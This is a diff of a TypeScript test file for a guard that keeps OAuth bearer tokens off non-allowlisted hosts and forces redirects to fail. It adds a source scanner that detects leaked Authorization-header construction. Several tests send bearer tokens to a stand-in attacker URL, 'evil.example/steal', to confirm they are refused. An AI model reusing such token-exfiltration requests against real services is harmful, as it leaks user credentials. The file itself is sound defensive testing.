@@ -3,6 +3,8 @@ import { dirname, join, relative } from 'node:path'
 import { fileURLToPath } from 'node:url'
 import { describe, expect, it, vi } from 'vitest'
 import { createAssistantMessageEventStream, type Provider } from '@earendil-works/pi-ai'
+import { xaiProvider } from '@earendil-works/pi-ai/providers/xai'
+import * as ts from 'typescript'
 import {
   assertBearerDestination,
   BearerDestinationError,
@@ -149,21 +151,38 @@ describe('fetchWithBearer', () => {
     )
     expect(fetchImpl).not.toHaveBeenCalled()
   })
+
+  it('overrides a caller redirect of follow', async () => {
+    const fetchImpl = vi.fn(async () => new Response('ok'))
+    const init: RequestInit = { method: 'GET', redirect: 'follow', headers: { accept: 'application/json' } }
+    await fetchWithBearer(fetchImpl as typeof fetch, XAI_MODELS_URL, 'oauth-secret', init)
+    expect(init.redirect).toBe('follow')
+    const [, sent] = fetchImpl.mock.calls[0] as unknown as [unknown, RequestInit]
+    expect(sent.redirect).toBe('error')
+    expect(sent.method).toBe('GET')
+    expect((sent.headers as Record<string, string>).authorization).toBe('Bearer oauth-secret')
+  })
 })
 
 describe('guardBearerFetch', () => {
   const inner = () => vi.fn(async () => new Response('ok'))
 
-  it('forwards an allowlisted bearer request unchanged', async () => {
+  it('sends an allowlisted bearer with redirect error', async () => {
     const fetchImpl = inner()
     const guarded = guardBearerFetch(fetchImpl as typeof fetch)
     const init: RequestInit = {
       method: 'POST',
+      redirect: 'follow',
       headers: { Authorization: 'Bearer secret', 'content-type': 'application/json' },
     }
     await guarded('https://api.x.ai/v1/responses', init)
+    expect(init.redirect).toBe('follow')
     expect(fetchImpl).toHaveBeenCalledOnce()
-    expect(fetchImpl.mock.calls[0]).toEqual(['https://api.x.ai/v1/responses', init])
+    const [url, sent] = fetchImpl.mock.calls[0] as unknown as [string, RequestInit]
+    expect(url).toBe('https://api.x.ai/v1/responses')
+    expect(sent.method).toBe('POST')
+    expect(sent.redirect).toBe('error')
+    expect(sent.headers).toBe(init.headers)
   })
 
   it('refuses a bearer on a look-alike before fetch runs', async () => {
@@ -175,26 +194,99 @@ describe('guardBearerFetch', () => {
     expect(fetchImpl).not.toHaveBeenCalled()
   })
 
+  it('refuses duplicate and mixed-case authorization off the allowlist', async () => {
+    const fetchImpl = inner()
+    const guarded = guardBearerFetch(fetchImpl as typeof fetch)
+    const cases: RequestInit[] = [
+      { headers: [['authorization', 'Basic x'], ['authorization', 'Bearer s']] },
+      { headers: [['Authorization', 'bEaReR secret-token']] },
+      { redirect: 'follow', headers: { authorization: 'Basic x, Bearer s' } },
+    ]
+    const appended = new Headers()
+    appended.append('authorization', 'Basic x')
+    appended.append('Authorization', 'Bearer s')
+    cases.push({ headers: appended, redirect: 'follow' })
+    for (const init of cases) {
+      await expect(guarded('https://evil.example/steal', init)).rejects.toBeInstanceOf(BearerDestinationError)
+    }
+    expect(fetchImpl).not.toHaveBeenCalled()
+    const allowed = new Headers()
+    allowed.append('authorization', 'Basic x')
+    allowed.append('authorization', 'Bearer s')
+    await guarded('https://api.x.ai/v1/models', { headers: allowed, redirect: 'manual' })
+    const [, sent] = fetchImpl.mock.calls[0] as unknown as [unknown, RequestInit]
+    expect(sent.redirect).toBe('error')
+    expect(sent.headers).toBe(allowed)
+  })
+
   it('refuses a Request that already carries the bearer', async () => {
     const fetchImpl = inner()
     const guarded = guardBearerFetch(fetchImpl as typeof fetch)
     const request = new Request('https://evil.example/steal', {
       headers: { authorization: 'Bearer secret-token' },
+      redirect: 'follow',
     })
     await expect(guarded(request)).rejects.toBeInstanceOf(BearerDestinationError)
     expect(fetchImpl).not.toHaveBeenCalled()
   })
 
-  it('forwards token-free requests, including hosts that must not see the bearer', async () => {
+  it('treats either the Request or init.headers as credentialed', async () => {
     const fetchImpl = inner()
     const guarded = guardBearerFetch(fetchImpl as typeof fetch)
-    await guarded('https://vidgen.x.ai/signed.mp4', { headers: { accept: 'video/mp4' } })
-    await guarded('https://auth.x.ai/oauth2/token', {
-      method: 'POST',
-      headers: { 'content-type': 'application/x-www-form-urlencoded' },
+    const bearerOnRequest = new Request('https://evil.example/steal', {
+      headers: { authorization: 'Bearer secret-token' },
+      redirect: 'follow',
     })
-    await guarded('https://evil.example/other', { headers: { authorization: 'Basic abc' } })
-    expect(fetchImpl).toHaveBeenCalledTimes(3)
+    await expect(guarded(bearerOnRequest, {
+      redirect: 'follow',
+      headers: { accept: 'text/plain' },
+    })).rejects.toBeInstanceOf(BearerDestinationError)
+
+    const bearerOnInit = new Request('https://evil.example/steal', {
+      headers: { accept: 'text/plain' },
+    })
+    await expect(guarded(bearerOnInit, {
+      redirect: 'follow',
+      headers: { authorization: 'bEaReR secret-token' },
+    })).rejects.toBeInstanceOf(BearerDestinationError)
+
+    const basicOnInit = new Request('https://evil.example/steal', {
+      headers: [['authorization', 'Basic x'], ['authorization', 'Bearer s']],
+    })
+    await expect(guarded(basicOnInit, {
+      headers: { authorization: 'Basic only' },
+    })).rejects.toBeInstanceOf(BearerDestinationError)
+    expect(fetchImpl).not.toHaveBeenCalled()
+
+    const allowed = new Request('https://api.x.ai/v1/models', {
+      headers: { authorization: 'Bearer secret-token' },
+      redirect: 'follow',
+    })
+    const init: RequestInit = { redirect: 'follow', headers: { accept: 'application/json' } }
+    await guarded(allowed, init)
+    expect(init.redirect).toBe('follow')
+    expect(allowed.redirect).toBe('follow')
+    const [sentRequest, sentInit] = fetchImpl.mock.calls[0] as unknown as [Request, RequestInit]
+    expect(sentRequest).toBe(allowed)
+    expect(sentInit.redirect).toBe('error')
+    expect(sentInit.headers).toEqual({ accept: 'application/json' })
+  })
+
+  it('forwards token-free requests and keeps their redirect mode', async () => {
+    const fetchImpl = inner()
+    const guarded = guardBearerFetch(fetchImpl as typeof fetch)
+    const download: RequestInit = { headers: { accept: 'video/mp4' }, redirect: 'follow' }
+    const login: RequestInit = {
+      method: 'POST',
+      redirect: 'manual',
+      headers: { 'content-type': 'application/x-www-form-urlencoded' },
+    }
+    await guarded('https://vidgen.x.ai/signed.mp4', download)
+    await guarded('https://auth.x.ai/oauth2/token', login)
+    expect(fetchImpl.mock.calls).toEqual([
+      ['https://vidgen.x.ai/signed.mp4', download],
+      ['https://auth.x.ai/oauth2/token', login],
+    ])
   })
 
   it('treats unreadable headers as credentialed and fails closed', async () => {
@@ -248,21 +340,218 @@ describe('chat bearer guard', () => {
     expect(fetchImpl).not.toHaveBeenCalled()
     await guarded!('https://api.x.ai/v1/responses', {
       headers: { authorization: 'Bearer secret-token' },
+      redirect: 'follow',
     })
     expect(fetchImpl).toHaveBeenCalledOnce()
+    const [, sent] = fetchImpl.mock.calls[0] as unknown as [unknown, RequestInit]
+    expect(sent.redirect).toBe('error')
+  })
+
+  it('drives the real pi-ai OpenAI SDK through the guarded fetch', async () => {
+    const fetchImpl = vi.fn(async () => new Response(JSON.stringify({
+      error: { message: 'stub', type: 'invalid_request_error' },
+    }), { status: 400, headers: { 'content-type': 'application/json' } }))
+    const wrapped = wrapXaiResponsesProvider(xaiProvider(), { backendSearch: false, retry401: false })
+
+    const evil = { ...GROK_46_MODEL, baseUrl: 'https://evil.example/v1' }
+    expect(() => wrapped.streamSimple(evil, { messages: [] } as never, {
+      fetch: fetchImpl as typeof fetch,
+      apiKey: 'oauth-secret',
+    })).toThrow(BearerDestinationError)
+    expect(fetchImpl).not.toHaveBeenCalled()
+
+    const stream = wrapped.streamSimple(GROK_46_MODEL, { messages: [] } as never, {
+      fetch: fetchImpl as typeof fetch,
+      apiKey: 'oauth-secret',
+    })
+    const events: string[] = []
+    for await (const event of stream) events.push(event.type)
+    expect(events).toContain('error')
+    expect(fetchImpl).toHaveBeenCalledOnce()
+    const [url, init] = fetchImpl.mock.calls[0] as unknown as [unknown, RequestInit]
+    const target = typeof url === 'string' ? url : url instanceof URL ? url.href : String(url)
+    expect(target).toBe('https://api.x.ai/v1/responses')
+    expect(init.redirect).toBe('error')
+    expect(new Headers(init.headers).get('authorization')).toBe('Bearer oauth-secret')
   })
 })
 
 describe('bearer attachment call sites', () => {
   const SRC_ROOT = join(dirname(fileURLToPath(import.meta.url)), '../src')
-  const ATTACHMENT_PATTERNS: readonly { name: string; pattern: RegExp }[] = [
-    { name: 'Bearer template', pattern: /Bearer \$\{/u },
-    { name: 'authorization bearer literal', pattern: /authorization\s*:\s*[`'"]Bearer\b/iu },
-    { name: 'authorization property assignment', pattern: /\.authorization\s*=/u },
-    { name: 'authorization bracket assignment', pattern: /\[\s*[`'"]authorization[`'"]\s*\]\s*=/iu },
-    { name: 'Headers set/append authorization', pattern: /\.(?:set|append)\(\s*[`'"]authorization[`'"]/iu },
-    { name: 'authorization bearer tuple', pattern: /[`'"]authorization[`'"]\s*,\s*[`'"]Bearer\b/iu },
+  const GUARD_FILE = 'bearer-guard.ts'
+
+  /**
+   * Diagnostic redaction mentions the header name inside a regex. Those files
+   * may match `redaction pattern` and nothing else.
+   */
+  const REDACTION_ALLOWLIST: readonly { file: string; rule: string; justification: string }[] = [
+    {
+      file: 'redact.ts',
+      rule: 'redaction pattern',
+      justification: 'Strips a Bearer scheme from OAuth error text before logging. Does not set a request header.',
+    },
+    {
+      file: 'capabilities.ts',
+      rule: 'redaction pattern',
+      justification: 'Strips authorization fields from diagnostic messages. Does not set a request header.',
+    },
   ]
+
+  interface Piece { text: string; value: string }
+  interface Finding { rule: string; excerpt: string }
+  interface PlusState { pieces: Piece[]; expectOperand: boolean }
+  interface Frame { values: string[]; texts: string[]; dirty: boolean }
+
+  const BEARER_VALUE = /^bearer\b/iu
+  const AUTH_NAME = /^authorization$/iu
+  const BEARER_WORD = /bearer\b/iu
+  // Same cases the TypeScript classifier refuses to rescan as a regex.
+  const NO_REGEX = new Set<ts.SyntaxKind>([
+    ts.SyntaxKind.Identifier,
+    ts.SyntaxKind.StringLiteral,
+    ts.SyntaxKind.NumericLiteral,
+    ts.SyntaxKind.BigIntLiteral,
+    ts.SyntaxKind.RegularExpressionLiteral,
+    ts.SyntaxKind.NoSubstitutionTemplateLiteral,
+    ts.SyntaxKind.TemplateTail,
+    ts.SyntaxKind.ThisKeyword,
+    ts.SyntaxKind.PlusPlusToken,
+    ts.SyntaxKind.MinusMinusToken,
+    ts.SyntaxKind.CloseParenToken,
+    ts.SyntaxKind.CloseBracketToken,
+    ts.SyntaxKind.CloseBraceToken,
+    ts.SyntaxKind.TrueKeyword,
+    ts.SyntaxKind.FalseKeyword,
+  ])
+
+  function scanBearerAttachment(source: string, variant: ts.LanguageVariant): Finding[] {
+    const scanner = ts.createScanner(ts.ScriptTarget.Latest, true, variant, source)
+    const findings: Finding[] = []
+    const plusStack: PlusState[] = [{ pieces: [], expectOperand: false }]
+    const frames: Frame[] = []
+
+    const add = (rule: string, excerpt: string) => {
+      findings.push({ rule, excerpt })
+    }
+    const plus = (): PlusState => plusStack[plusStack.length - 1]!
+
+    const flushPlus = () => {
+      const state = plus()
+      if (state.pieces.length >= 2) {
+        const joined = state.pieces.map(piece => piece.value).join('')
+        const excerpt = state.pieces.map(piece => piece.text).join(' + ')
+        if (BEARER_WORD.test(joined)) add('concatenated bearer literal', excerpt)
+        if (AUTH_NAME.test(joined)) add('concatenated authorization header name', excerpt)
+      }
+      state.pieces = []
+      state.expectOperand = false
+    }
+
+    const pushPlus = (piece: Piece) => {
+      const state = plus()
+      if (state.pieces.length > 0 && !state.expectOperand) flushPlus()
+      plus().pieces.push(piece)
+      plus().expectOperand = false
+    }
+
+    const noteAtom = (text: string, value: string) => {
+      if (BEARER_VALUE.test(value)) add('bearer literal', text)
+      if (AUTH_NAME.test(value)) add('authorization header name', text)
+      pushPlus({ text, value })
+    }
+
+    const closeFrame = (text: string, value: string, finish: boolean) => {
+      const state = plus()
+      const interp = state.pieces.map(piece => piece.value)
+      const pending = state.expectOperand
+      flushPlus()
+      if (plusStack.length > 1) plusStack.pop()
+      const frame = frames.pop()
+      if (frame === undefined) return
+      if (!frame.dirty && !pending) {
+        for (const part of interp) frame.values.push(part)
+      }
+      frame.values.push(value)
+      frame.texts.push(text)
+      frame.dirty = false
+      if (!finish) {
+        frames.push(frame)
+        plusStack.push({ pieces: [], expectOperand: false })
+        return
+      }
+      const joined = frame.values.join('')
+      const excerpt = frame.texts.join('')
+      if (BEARER_WORD.test(joined)) add('concatenated bearer literal', excerpt)
+      if (AUTH_NAME.test(joined)) add('concatenated authorization header name', excerpt)
+      pushPlus({ text: excerpt, value: joined })
+    }
+
+    let previous = ts.SyntaxKind.Unknown
+    const templateStack: ts.SyntaxKind[] = []
+    const retokenize = (kind: ts.SyntaxKind): ts.SyntaxKind => {
+      if ((kind === ts.SyntaxKind.SlashToken || kind === ts.SyntaxKind.SlashEqualsToken) && !NO_REGEX.has(previous)) {
+        const rescanned = scanner.reScanSlashToken()
+        if (rescanned === ts.SyntaxKind.RegularExpressionLiteral) return rescanned
+      }
+      if (kind === ts.SyntaxKind.CloseBraceToken && templateStack.length > 0) {
+        const top = templateStack[templateStack.length - 1]
+        if (top === ts.SyntaxKind.TemplateHead) {
+          const rescanned = scanner.reScanTemplateToken(false)
+          if (rescanned === ts.SyntaxKind.TemplateTail) templateStack.pop()
+          return rescanned
+        }
+        templateStack.pop()
+        return kind
+      }
+      if (kind === ts.SyntaxKind.TemplateHead) templateStack.push(ts.SyntaxKind.TemplateHead)
+      else if (kind === ts.SyntaxKind.OpenBraceToken && templateStack.length > 0) {
+        templateStack.push(ts.SyntaxKind.OpenBraceToken)
+      }
+      return kind
+    }
+
+    for (let kind = scanner.scan(); kind !== ts.SyntaxKind.EndOfFileToken; kind = scanner.scan()) {
+      kind = retokenize(kind)
+      previous = kind
+      const text = scanner.getTokenText()
+      if (kind === ts.SyntaxKind.StringLiteral || kind === ts.SyntaxKind.NoSubstitutionTemplateLiteral) {
+        noteAtom(text, scanner.getTokenValue())
+        continue
+      }
+      if (kind === ts.SyntaxKind.TemplateHead) {
+        const value = scanner.getTokenValue()
+        if (BEARER_VALUE.test(value)) add('bearer literal', text)
+        if (AUTH_NAME.test(value)) add('authorization header name', text)
+        frames.push({ values: [value], texts: [text], dirty: false })
+        plusStack.push({ pieces: [], expectOperand: false })
+        continue
+      }
+      if (kind === ts.SyntaxKind.TemplateMiddle || kind === ts.SyntaxKind.TemplateTail) {
+        closeFrame(text, scanner.getTokenValue(), kind === ts.SyntaxKind.TemplateTail)
+        continue
+      }
+      if (kind === ts.SyntaxKind.PlusToken && plus().pieces.length > 0) {
+        plus().expectOperand = true
+        continue
+      }
+      if (kind === ts.SyntaxKind.OpenParenToken || kind === ts.SyntaxKind.CloseParenToken) continue
+      if (kind === ts.SyntaxKind.Identifier && AUTH_NAME.test(text)) {
+        add('authorization header name', text)
+      }
+      if (kind === ts.SyntaxKind.RegularExpressionLiteral
+        && (BEARER_WORD.test(text) || /\bauthorization\b/iu.test(text))) {
+        add('redaction pattern', text)
+      }
+      if (frames.length > 0) frames[frames.length - 1]!.dirty = true
+      flushPlus()
+    }
+    flushPlus()
+    return findings
+  }
+
+  function allowedFinding(rel: string, finding: Finding): boolean {
+    return REDACTION_ALLOWLIST.some(entry => entry.file === rel && entry.rule === finding.rule)
+  }
 
   function sourceFiles(dir: string): string[] {
     const files: string[] = []
@@ -274,20 +563,71 @@ describe('bearer attachment call sites', () => {
     return files
   }
 
+  const BAD_FIXTURES: readonly { name: string; source: string; rule: string }[] = [
+    { name: 'scheme assigned before the header', source: `const value = 'Bearer ' + token`, rule: 'bearer literal' },
+    { name: 'double quoted scheme', source: `const value = "Bearer " + token`, rule: 'bearer literal' },
+    { name: 'template scheme', source: 'const value = `Bearer ${token}`', rule: 'bearer literal' },
+    { name: 'header name in a constant', source: `const name = 'authorization'\nheaders[name] = token`, rule: 'authorization header name' },
+    { name: 'array-form headers', source: `const headers = [['Authorization', 'Bearer ' + token]]`, rule: 'bearer literal' },
+    { name: 'split bearer literal', source: `const value = 'Bear' + 'er ' + token`, rule: 'concatenated bearer literal' },
+    { name: 'split template bearer', source: 'const value = `Bea` + `rer ${token}`', rule: 'concatenated bearer literal' },
+    { name: 'bearer split inside a template', source: 'const value = `Bear${\'er \'}${token}`', rule: 'concatenated bearer literal' },
+    { name: 'split header name', source: `const name = 'author' + 'ization'`, rule: 'concatenated authorization header name' },
+    { name: 'headers.set', source: `headers.set('Authorization', token)`, rule: 'authorization header name' },
+    { name: 'headers.append', source: `headers.append("authorization", token)`, rule: 'authorization header name' },
+    { name: 'property assignment', source: `out.authorization = token`, rule: 'authorization header name' },
+    { name: 'bracket assignment', source: `headers['authorization'] = token`, rule: 'authorization header name' },
+    { name: 'object key', source: `const headers = { authorization: token }`, rule: 'authorization header name' },
+  ]
+
+  const GOOD_FIXTURES = [
+    `throw new Error('xAI returned an unsafe authorization URL')`,
+    `// 'authorization': 'Bearer secret'\nconst ok = 1`,
+    `const note = 'OAuth bearer stays on the allowlist'`,
+    `fetchWithBearer(fetchImpl, url, token, { headers: { accept: 'application/json' } })`,
+  ]
+
+  it('catches known-bad header constructions', () => {
+    const missed: string[] = []
+    for (const fixture of BAD_FIXTURES) {
+      const rules = scanBearerAttachment(fixture.source, ts.LanguageVariant.Standard).map(finding => finding.rule)
+      if (!rules.includes(fixture.rule)) missed.push(`${fixture.name}: got ${rules.join(', ') || 'nothing'}`)
+    }
+    expect(missed).toEqual([])
+  })
+
+  it('ignores prose, comments, and the fetchWithBearer call shape', () => {
+    for (const source of GOOD_FIXTURES) {
+      expect(scanBearerAttachment(source, ts.LanguageVariant.Standard), source).toEqual([])
+    }
+  })
+
+  it('keeps the redaction allowlist load-bearing and narrow', () => {
+    for (const entry of REDACTION_ALLOWLIST) {
+      expect(entry.justification.length).toBeGreaterThan(40)
+      const text = readFileSync(join(SRC_ROOT, entry.file), 'utf8')
+      const raw = scanBearerAttachment(text, ts.LanguageVariant.Standard)
+      expect(raw.some(finding => finding.rule === entry.rule), entry.file).toBe(true)
+      const hidden = raw.filter(finding => finding.rule !== entry.rule)
+      expect(hidden, entry.file).toEqual([])
+      const leaked = `${text}\nconst leaked = 'Bearer ' + token\n`
+      const after = scanBearerAttachment(leaked, ts.LanguageVariant.Standard)
+        .filter(finding => !allowedFinding(entry.file, finding))
+      expect(after.some(finding => finding.rule === 'bearer literal')).toBe(true)
+    }
+  })
+
   it('builds an Authorization bearer only inside the destination guard', () => {
     const offenders: string[] = []
-    let templates = 0
     for (const file of sourceFiles(SRC_ROOT)) {
-      const text = readFileSync(file, 'utf8')
       const rel = relative(SRC_ROOT, file)
-      const inGuard = rel === 'bearer-guard.ts'
-      for (const { name, pattern } of ATTACHMENT_PATTERNS) {
-        const matches = text.match(new RegExp(pattern.source, pattern.flags.includes('g') ? pattern.flags : `${pattern.flags}g`))
-        if (name === 'Bearer template') templates += matches?.length ?? 0
-        if (!inGuard && matches !== null && matches.length > 0) offenders.push(`${rel}: ${name}`)
+      if (rel === GUARD_FILE) continue
+      const variant = rel.endsWith('.tsx') ? ts.LanguageVariant.JSX : ts.LanguageVariant.Standard
+      for (const finding of scanBearerAttachment(readFileSync(file, 'utf8'), variant)) {
+        if (allowedFinding(rel, finding)) continue
+        offenders.push(`${rel}: ${finding.rule}: ${finding.excerpt}`)
       }
     }
     expect(offenders).toEqual([])
-    expect(templates).toBe(1)
   })
 })
